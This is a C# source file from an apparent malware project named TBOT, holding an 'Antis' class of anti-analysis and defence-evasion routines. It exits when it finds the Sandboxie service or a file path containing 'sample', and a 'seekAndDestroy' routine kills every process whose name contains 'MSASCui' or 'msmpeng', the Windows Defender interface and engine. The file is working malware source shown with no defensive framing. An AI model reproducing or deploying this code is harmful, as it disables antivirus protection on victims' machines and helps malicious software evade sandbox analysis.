using System.Diagnostics;
using System.Runtime.InteropServices;

namespace TBOT;

public class Antis
{
	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long FindWindowA(string lpClassName, string lpWindowName);

	public static void Check()
	{
		antiSandboxie();
		seekAndDestroy("MSASCui");
		seekAndDestroy("msmpeng");
		antiThreatExpert();
	}

	public static void antiSandboxie()
	{
		if (Process.GetProcessesByName("SbieSvc").Length >= 1)
		{
			Functions.kill();
		}
	}

	public static void seekAndDestroy(string process)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process2 in processes)
		{
			if (process2.ProcessName.Contains(process))
			{
				process2.Kill();
			}
		}
	}

	private static void antiThreatExpert()
	{
		if (Process.GetCurrentProcess().MainModule!.FileName!.Contains("sample"))
		{
			Functions.kill();
		}
	}
}
